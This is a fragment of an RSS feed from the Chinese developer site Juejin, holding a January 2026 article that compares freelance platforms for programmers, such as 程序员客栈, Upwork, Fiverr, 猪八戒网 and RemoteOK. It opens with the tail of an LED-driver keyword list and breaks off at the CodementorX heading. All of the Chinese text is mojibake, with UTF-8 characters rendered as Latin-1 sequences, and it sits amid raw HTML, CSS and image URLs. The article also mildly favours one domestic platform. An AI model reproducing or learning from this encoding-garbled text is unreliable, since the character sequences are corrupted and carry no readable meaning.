ç®¡é©±åŠ¨èŠ¯ç‰‡ã€LEDæ˜¾ç¤ºé©±åŠ¨èŠ¯ç‰‡ã€æ˜¾ç¤ºæ•°ç ç®¡é©±åŠ¨ã€LEDæ§åˆ¶ç”µè·¯ã€æ•°æ˜¾LEDé©±åŠ¨èŠ¯ç‰‡ã€æ•°æ˜¾LEDé©±åŠ¨ICã€LEDé©±åŠ¨èŠ¯ç‰‡ã€æ•°ç ç®¡æ˜¾ç¤ºå±é©±åŠ¨ã€æ•°ç ç®¡é©±åŠ¨åŸå‚ã€LEDé©±åŠ¨å‚å®¶ã€LEDé©±åŠ¨åŸå‚ã€LEDæ•°ç é©±åŠ¨ã€LEDæ•°ç å±é©±åŠ¨ã€LEDæ•°æ˜¾èŠ¯ç‰‡ã€æ•°ç ç®¡é©±åŠ¨ICã€æ˜¾ç¤ºLEDé©±åŠ¨ã€æ•°ç ç®¡LEDé©±åŠ¨ã€LEDæ˜¾ç¤ºICã€ç‚¹é˜µæ•°æ˜¾é©±åŠ¨ã€ç‚¹é˜µæ•°ç ç®¡é©±åŠ¨ã€ç‚¹é˜µLEDé©±åŠ¨ã€ç‚¹é˜µæ•°æ˜¾é©±åŠ¨èŠ¯ç‰‡ã€ç‚¹é˜µæ•°æ˜¾é©±åŠ¨ICã€ç‚¹é˜µLEDé©±åŠ¨èŠ¯ç‰‡ã€ç‚¹é˜µLEDé©±åŠ¨ICã€LEDæ•°æ˜¾åŸå‚ã€ç‚¹é˜µæ•°ç ç®¡æ˜¾ç¤ºèŠ¯ç‰‡ã€æ•°ç ç®¡é©±åŠ¨å‚å®¶ã€æ•°æ˜¾LEDåŸå‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 å¹´ç¨‹åºå‘˜æ¥å•å…¨æŒ‡å—ï¼šå¹³å°è¿™ä¹ˆå¤šï¼Œåˆ«å†é€‰é”™äº†]]></title>    <link>https://juejin.cn/post/7595365551607185459</link>    <guid>https://juejin.cn/post/7595365551607185459</guid>    <pubDate>2026-01-15T08:32:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595365551607185459" data-draft-id="7595351120668442650" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 å¹´ç¨‹åºå‘˜æ¥å•å…¨æŒ‡å—ï¼šå¹³å°è¿™ä¹ˆå¤šï¼Œåˆ«å†é€‰é”™äº†"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-15T08:32:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€”å¼ºçš„çŸ³å¤´_"/> <meta itemprop="url" content="https://juejin.cn/user/3168119757484368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 å¹´ç¨‹åºå‘˜æ¥å•å…¨æŒ‡å—ï¼šå¹³å°è¿™ä¹ˆå¤šï¼Œåˆ«å†é€‰é”™äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3168119757484368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€”å¼ºçš„çŸ³å¤´_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:32:44.000Z" title="Thu Jan 15 2026 08:32:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™ä¸¤å¹´ï¼Œè¡Œæƒ…æ…¢æ…¢å†·é™ä¸‹æ¥ï¼Œå²—ä½ç«äº‰ä¹Ÿè‚‰çœ¼å¯è§åœ°å·äº†èµ·æ¥ï¼Œèº«è¾¹ä¸å°‘ç¨‹åºå‘˜å¼€å§‹ç»™è‡ªå·±ç•™åè·¯ã€‚æœ‰äººæƒ³å¤šèµšç‚¹ï¼Œç»™æ”¶å…¥åŠ ä¸ªç¼“å†²ï¼›æœ‰äººæƒ³æ”’ç‚¹çœŸå®é¡¹ç›®ï¼Œåˆ«ç®€å†ä¸€ç¿»å…¨æ˜¯åœ¨èŒæœŸé—´å‚ä¸ï¼›ä¹Ÿæœ‰äººå¹²è„†æŠŠç¨‹åºå‘˜æ¥å•å½“æˆä»å…¨èŒå¾€æ›´è‡ªç”±çŠ¶æ€è¿‡æ¸¡çš„ä¸€æ­¥ã€‚</p>
<p>å¯çœŸå¼€å§‹æ¥å•ä¹‹åï¼Œå¾ˆå¤šäººå¾ˆå¿«ä¼šå‘ç°ä¸€ä¸ªæ‰å¿ƒçš„äº‹å®ï¼š<strong>æ¥ä¸åˆ°å•è¿˜ä¸æ˜¯æœ€éš¾å—çš„ï¼Œæœ€éš¾å—çš„æ˜¯åœ¨ä¸åˆé€‚çš„å¹³å°ä¸Šï¼Œè¢«æµç¨‹ã€æ²Ÿé€šå’Œæ¥å›æ‹‰æ‰¯ä¸€ç‚¹ç‚¹ç£¨æ²¡è€å¿ƒã€‚</strong></p>
<p>ç¨‹åºå‘˜æ¥å•çš„å¹³å°ç¡®å®ä¸å°‘ï¼Œä½†ç”¨èµ·æ¥å·®åˆ«éå¸¸å¤§ã€‚æœ‰çš„å¹³å°é¡¹ç›®çœ‹ç€ä¸€å¤§å †ï¼ŒèŠä¸‹æ¥å‘ç°ä¸æ˜¯éœ€æ±‚ä¸æ¸…æ¥šï¼Œå°±æ˜¯åå¤æ”¹å£ï¼›æœ‰çš„å¹³å°é—¨æ§›é«˜ã€èŠ‚å¥æ…¢ï¼Œå•å­ä¸å¤šï¼Œä½†èµ·ç ä¸å¤ªæŠ˜è…¾äººï¼›è¿˜æœ‰çš„å¹³å°åªè´Ÿè´£æŠŠä¿¡æ¯å¾€ä½ è„¸ä¸Šä¸€ä¸¢ï¼Œåé¢æ€ä¹ˆè°ˆã€é ä¸é è°±ï¼Œå…¨é è‡ªå·±æ‰›ã€‚</p>
<p>è¯´åˆ°åº•ï¼Œææ¸…æ¥šè¿™äº›å¹³å°å„è‡ªæ˜¯å¹²å˜›çš„ï¼Œæœ¬èº«å°±æ˜¯ç¨‹åºå‘˜æ¥å•è·¯ä¸Šçš„å¿…ä¿®è¯¾ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7865ca7e1742460ba688ffc31720bd5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=x9Hc8SE17cl3rMJTsAckejPXWGA%3D" alt="" loading="lazy"/></p>
<p>ä¸‹é¢è¿™éƒ¨åˆ†ï¼Œä¸æ˜¯æ¨èæ¦œï¼Œä¹Ÿä¸å¹è°å¥½ç”¨ï¼Œè€Œæ˜¯ç»“åˆå®é™…è¸©å‘ä½“éªŒï¼ŒæŠŠä¸€äº›å¸¸è§çš„ç¨‹åºå‘˜æ¥å•å¹³å°è®²æ¸…æ¥šï¼Œå¸®ä½ åˆ¤æ–­<strong>å®ƒåˆ°åº•é€‚ä¸é€‚åˆä½ ç°åœ¨è¿™ä¸ªé˜¶æ®µã€‚</strong></p>
<h2 data-id="heading-0">ç¨‹åºå‘˜å®¢æ ˆ</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cb1a36c37ab435a9190fbf7cb7f3f06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=3O3l%2F7eOxhZF2eVUPshbBZV%2B5t0%3D" alt="" loading="lazy"/></p>
<p>ç¨‹åºå‘˜å®¢æ ˆç®—æ˜¯å›½å†…æ¯”è¾ƒå…¸å‹ã€ä¹Ÿæ¯”è¾ƒå‚ç›´çš„ç¨‹åºå‘˜æ¥å•å¹³å°ã€‚å¹³å°ä¸Šçš„é¡¹ç›®å¤§å¤šé›†ä¸­åœ¨æŠ€æœ¯å¼€å‘é¢†åŸŸï¼Œæ¯”å¦‚å‰ç«¯ã€åç«¯ã€ç³»ç»Ÿå®šåˆ¶ã€å°ç¨‹åºã€ä¼ä¸šå†…éƒ¨å·¥å…·ç­‰ï¼ŒæŠ€æœ¯æŒ‡å‘éå¸¸æ˜ç¡®ã€‚</p>
<p>å¹³å°æ•´ä½“æµç¨‹ç›¸å¯¹è§„èŒƒï¼Œä»éœ€æ±‚å‘å¸ƒã€æ²Ÿé€šã€æ‰˜ç®¡åˆ°äº¤ä»˜ç»“ç®—ï¼Œéƒ½æœ‰æ¸…æ™°çš„è§„åˆ™ï¼Œå¯¹ç¨‹åºå‘˜æ¥è¯´å¯æ§æ€§è¾ƒå¼ºã€‚ä¸éœ€è¦åœ¨å¤§é‡éæŠ€æœ¯éœ€æ±‚ä¸­åå¤ç­›é€‰ï¼Œè¿™ä¸€ç‚¹å¯¹é•¿æœŸæ¥å•çš„äººéå¸¸é‡è¦ã€‚</p>
<p>ä»å®é™…æƒ…å†µæ¥çœ‹ï¼Œå¹³å°å†…ç¡®å®ä¼šæœ‰å¤šåå¼€å‘è€…åŒæ—¶å‚ä¸åŒä¸€éœ€æ±‚ï¼Œé¡¹ç›®ä»·æ ¼åŒºé—´ä¹Ÿå­˜åœ¨ä¸€å®šå·®å¼‚ã€‚ä½†å¥½å¤„åœ¨äºï¼Œéœ€æ±‚ç›¸å¯¹é›†ä¸­ã€è§„åˆ™æ¸…æ™°ï¼Œåªè¦ä½ çš„æŠ€æœ¯æ–¹å‘æ˜ç¡®ï¼Œèƒ½å¿«é€Ÿåˆ¤æ–­é¡¹ç›®æ˜¯å¦åŒ¹é…ï¼Œå°±ä¸éœ€è¦åœ¨æ— æ•ˆé¡¹ç›®ä¸Šåå¤æ¶ˆè€—ç²¾åŠ›ã€‚æ•´ä½“æ›´é€‚åˆæŠŠç¨‹åºå‘˜æ¥å•å½“ä½œä¸€æ¡é•¿æœŸã€ç¨³å®šçš„è¡¥å……æ”¶å…¥æ¸ é“æ¥ç»è¥ï¼Œè€Œä¸æ˜¯è¿½æ±‚ä¸€æ¬¡æ€§å¿«å•æˆ–çŸ­æœŸå†²é‡çš„æ–¹å¼ã€‚</p>
<h2 data-id="heading-1">Upwork</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0428b9e966344fd835202730ef5abaf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=NdCZwZtliwpMLMY7N4H7u2hrItY%3D" alt="" loading="lazy"/></p>
<p>Upwork æ˜¯æµ·å¤–å¹³å°é‡Œä½“é‡éå¸¸å¤§çš„ä¸€ä¸ªï¼Œé¡¹ç›®ç±»å‹ä¸°å¯Œï¼Œå®¢æˆ·æ¥æºå›½é™…åŒ–ï¼Œè§„åˆ™ä½“ç³»ä¹Ÿç›¸å¯¹æˆç†Ÿã€‚</p>
<p>ä¼˜åŠ¿åœ¨äºé¡¹ç›®æ•°é‡å¤šã€é¢„ç®—åŒºé—´å¹¿ï¼Œä½†é—®é¢˜ä¹Ÿå¾ˆæ˜æ˜¾ï¼šç«äº‰éå¸¸æ¿€çƒˆï¼Œæ–°è´¦å·å‰æœŸéœ€è¦æŠ•å…¥å¤§é‡æ—¶é—´æŠ•æ ‡ã€æ²Ÿé€šã€ç§¯ç´¯è¯„ä»·ï¼Œå¹³å°æŠ½æˆä¸ä½ï¼Œå¯¹è‹±æ–‡æ²Ÿé€šèƒ½åŠ›è¦æ±‚è¾ƒé«˜ã€‚</p>
<p>æ•´ä½“æ¥çœ‹ï¼Œæ›´é€‚åˆæœ‰ä¸€å®šé¡¹ç›®ç»éªŒã€æ„¿æ„æ¥å—å‰æœŸæ…¢çƒ­ã€å¸Œæœ›å°è¯•å›½é™…å¸‚åœºçš„ç¨‹åºå‘˜ï¼Œä¸å¤ªé€‚åˆæ€¥ç€é€šè¿‡æ¥å•å®ç°ç¨³å®šç°é‡‘æµçš„äººã€‚</p>
<h2 data-id="heading-2">Fiverr</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96f12d3d2bfd419a9a68033cba4893c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=K5H%2BwYkyn6Eh2PXjsgG3IWlQL5I%3D" alt="" loading="lazy"/></p>
<p>Fiverr çš„æ¨¡å¼å’Œä¼ ç»Ÿæ¥å•å¹³å°ä¸å¤ªä¸€æ ·ï¼Œæ›´åƒæ˜¯æŠŠæœåŠ¡åšæˆå•†å“ã€‚å¼€å‘è€…å°†æŸä¸€å…·ä½“èƒ½åŠ›æ‰“åŒ…æˆæ˜ç¡®çš„æœåŠ¡ï¼Œæ¯”å¦‚æ¥å£å¼€å‘ã€åŠŸèƒ½å®ç°ã€è„šæœ¬å¤„ç†ï¼Œç›´æ¥æ˜ç æ ‡ä»·ï¼Œå®¢æˆ·æŒ‰éœ€ä¸‹å•ã€‚</p>
<p>è¿™ç§æ–¹å¼çš„å¥½å¤„æ˜¯è¾¹ç•Œæ¸…æ™°ã€æ²Ÿé€šæˆæœ¬ä½ï¼Œäº¤ä»˜é¢„æœŸç›¸å¯¹ç¨³å®šï¼›ä½†ä»·æ ¼ä½“ç³»é€æ˜ï¼Œä¹Ÿæ„å‘³ç€å‹ä»·ç©ºé—´æœ‰é™ã€‚</p>
<p>æ›´é€‚åˆèƒ½æŠŠæŠ€æœ¯èƒ½åŠ›æ‹†åˆ†æ¸…æ¥šã€æ„¿æ„ç”¨æ ‡å‡†åŒ–æ–¹å¼æ¥åšå…¼èŒçš„å¼€å‘è€…ã€‚</p>
<h2 data-id="heading-3">Freelancer</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d09b7c49864a41c4bcf230d5d2bf1f9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=n5Gp67P9OLBOt6C5ZXoX98QHqSE%3D" alt="" loading="lazy"/></p>
<p>Freelancer æ˜¯æ¯”è¾ƒå…¸å‹çš„ç«æ ‡æ¨¡å¼æ¥å•å¹³å°ï¼Œé¡¹ç›®æ•°é‡å¤šã€è¦†ç›–é¢†åŸŸå¹¿ã€‚ç«æ ‡æœºåˆ¶å†³å®šäº†ç«äº‰éå¸¸ç›´æ¥ï¼Œä»·æ ¼åŒºé—´è·¨åº¦å¤§ï¼Œæ–°äººå‰æœŸå¾ˆå®¹æ˜“è¢«å·è¿›ä½ä»·ç«äº‰ï¼Œéœ€è¦èŠ±æ—¶é—´ç†Ÿæ‚‰å¹³å°è§„åˆ™å’Œå®¢æˆ·é¢„æœŸï¼Œæ…¢æ…¢å»ºç«‹è¯„ä»·ä½“ç³»ã€‚</p>
<p>æ•´ä½“æ¥çœ‹ï¼Œæ›´é€‚åˆä½œä¸ºå°è¯•æµ·å¤–å¸‚åœºã€ç§¯ç´¯ç«æ ‡ç»éªŒçš„è¡¥å……æ¸ é“ï¼Œè€Œä¸å¤ªé€‚åˆä½œä¸ºä¸€å¼€å§‹å°±è¿½æ±‚ç¨³å®šè¾“å‡ºçš„ä¸»è¦æ¥å•æ–¹å¼ã€‚</p>
<h2 data-id="heading-4">çŒªå…«æˆ’ç½‘</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d90f5d57ff8c4efe922a46f63761d7da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=fY3GvCbw80lpCLvVFFevJpyXAeI%3D" alt="" loading="lazy"/></p>
<p>çŒªå…«æˆ’ç½‘åœ¨è½¯ä»¶å¤–åŒ…å’Œæ¥å•é¢†åŸŸç¡®å®å­˜åœ¨æ—¶é—´è¾ƒé•¿ï¼Œé¡¹ç›®æ•°é‡ä¹Ÿä¸€ç›´ä¸ä½ï¼Œä½†å¹³å°å†…æœåŠ¡å•†æ•°é‡åºå¤§ï¼ŒåŒç±»éœ€æ±‚ä¸‹å¾€å¾€ä¼šå‡ºç°å¤šäººåŒæ—¶å‚ä¸çš„æƒ…å†µã€‚å®¢æˆ·åœ¨å†³ç­–è¿‡ç¨‹ä¸­ä¹ æƒ¯åå¤å¯¹æ¯”æ–¹æ¡ˆå’ŒæŠ¥ä»·ï¼Œæ²Ÿé€šå‘¨æœŸå®¹æ˜“è¢«æ‹‰é•¿ï¼Œå‰æœŸæŠ•å…¥çš„æ—¶é—´æˆæœ¬ç›¸å¯¹è¾ƒé«˜ã€‚</p>
<p>åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œéƒ¨åˆ†éœ€æ±‚æè¿°å¹¶ä¸å¤Ÿç»†è‡´ï¼Œéœ€è¦å¼€å‘è€…è‡ªè¡Œæ‹†è§£å’Œåå¤ç¡®è®¤ï¼Œæ‰èƒ½åˆ¤æ–­çœŸå®å·¥ä½œé‡å’Œé£é™©ã€‚å¦‚æœè‡ªèº«æŠ€æœ¯å®šä½ä¸å¤Ÿæ¸…æ™°ï¼Œæˆ–è€…ä¸æ“…é•¿å¿«é€Ÿç­›é€‰é¡¹ç›®ï¼Œå¾ˆå®¹æ˜“åœ¨æ²Ÿé€šé˜¶æ®µæ¶ˆè€—å¤§é‡ç²¾åŠ›å´æœªå¿…èƒ½è½¬åŒ–ä¸ºæœ‰æ•ˆåˆä½œã€‚æ•´ä½“æ¥çœ‹ï¼Œæ›´è€ƒéªŒç¨‹åºå‘˜å¯¹é¡¹ç›®ä»·å€¼çš„åˆ¤æ–­èƒ½åŠ›å’Œè€å¿ƒã€‚</p>
<h2 data-id="heading-5">ä¸€å“å¨å®¢</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4efd2f7afb042b5affb0740a5643b28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=Dxr0298SXFu4Vxnx7Fyw1p6LJYw%3D" alt="" loading="lazy"/></p>
<p>ä¸€å“å¨å®¢çš„ä¸šåŠ¡è¦†ç›–é¢å¾ˆå¹¿ï¼Œç¨‹åºå‘˜åªæ˜¯å…¶ä¸­ä¸€éƒ¨åˆ†ã€‚æŠ€æœ¯éœ€æ±‚å¾€å¾€æ··åœ¨è®¾è®¡ã€æ–‡æ¡ˆã€è¥é”€ç­‰ä»»åŠ¡ä¸­ï¼Œç­›é€‰æˆæœ¬ç›¸å¯¹åé«˜ã€‚</p>
<p>å¶å°”åˆ·ä¸€åˆ·ï¼Œç¡®å®èƒ½çœ‹åˆ°ä¸€äº›å¼€å‘ç›¸å…³é¡¹ç›®ï¼Œä½†æ•´ä½“æ•ˆç‡ä¸ç®—é«˜ã€‚å¦‚æœå½“ä½œä¸»åŠ›å¹³å°ï¼Œæ€§ä»·æ¯”å¹¶ä¸çªå‡ºï¼Œæ›´é€‚åˆä½œä¸ºè¡¥å……æ¸ é“å­˜åœ¨ã€‚</p>
<h2 data-id="heading-6">RemoteOK</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c86ab69f8ae4cf5874718937bd9a7b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=IoYJ8fImyu9dk8mgmTfWwmxKK5Q%3D" alt="" loading="lazy"/></p>
<p>RemoteOK æ›´åƒæ˜¯è¿œç¨‹å²—ä½å’Œç¨‹åºå‘˜æ¥å•éœ€æ±‚çš„é›†åˆå…¥å£ï¼Œæ›´æ–°é€Ÿåº¦å¿«ã€è¦†ç›–é¢å¹¿ã€‚</p>
<p>ä½†å¹³å°æœ¬èº«å¹¶ä¸å‚ä¸äº¤æ˜“æµç¨‹ï¼Œä»ç­›é€‰é¡¹ç›®ã€è”ç³»å®¢æˆ·ï¼Œåˆ°é£é™©åˆ¤æ–­ï¼Œå‡ ä¹å®Œå…¨ä¾èµ–ä¸ªäººç»éªŒã€‚æ›´é€‚åˆç”¨æ¥æ‹“å®½ä¿¡æ¯æ¥æºã€è§‚å¯Ÿå¸‚åœºå˜åŒ–ï¼Œè€Œä¸å»ºè®®å®Œå…¨ä¾èµ–å®ƒæ¥æ¥å•ã€‚</p>
<h2 data-id="heading-7">WeWorkRemotely</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52d0b983697245579dacc1c4b9afd8b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=oKwhEF7U8wBUa3ZWjzSM%2B21%2F6qs%3D" alt="" loading="lazy"/></p>
<p>WeWorkRemotely ä»¥è¿œç¨‹å²—ä½ä¿¡æ¯ä¸ºä¸»ï¼Œä¹ŸåŒ…å«ä¸€å®šæ¯”ä¾‹çš„ç¨‹åºå‘˜æ¥å•æˆ–é¡¹ç›®å‹éœ€æ±‚ã€‚å¹³å°åå±•ç¤ºå‹ï¼Œå¯¹åˆä½œæµç¨‹å¹²é¢„è¾ƒå°‘ï¼Œé¡¹ç›®ä¿¡æ¯è´¨é‡å·®å¼‚è¾ƒå¤§ã€‚</p>
<p>å¯¹ç¨‹åºå‘˜æ¥è¯´ï¼Œå®ƒæ›´é€‚åˆç”¨æ¥äº†è§£å¸‚åœºéœ€æ±‚ã€å²—ä½è¶‹åŠ¿ï¼Œæˆ–è€…ä½œä¸ºæœºä¼šè¡¥å……ï¼Œè€Œä¸æ˜¯é«˜é¢‘ã€ç¨³å®šæ¥å•çš„å¹³å°ã€‚</p>
<h2 data-id="heading-8">CodementorX</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f32523344364598a327f353153023c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=QM3lkUtkiAHBPSdWGGJTHpR%2FIX8%3D" alt="" loading="lazy"/></p>
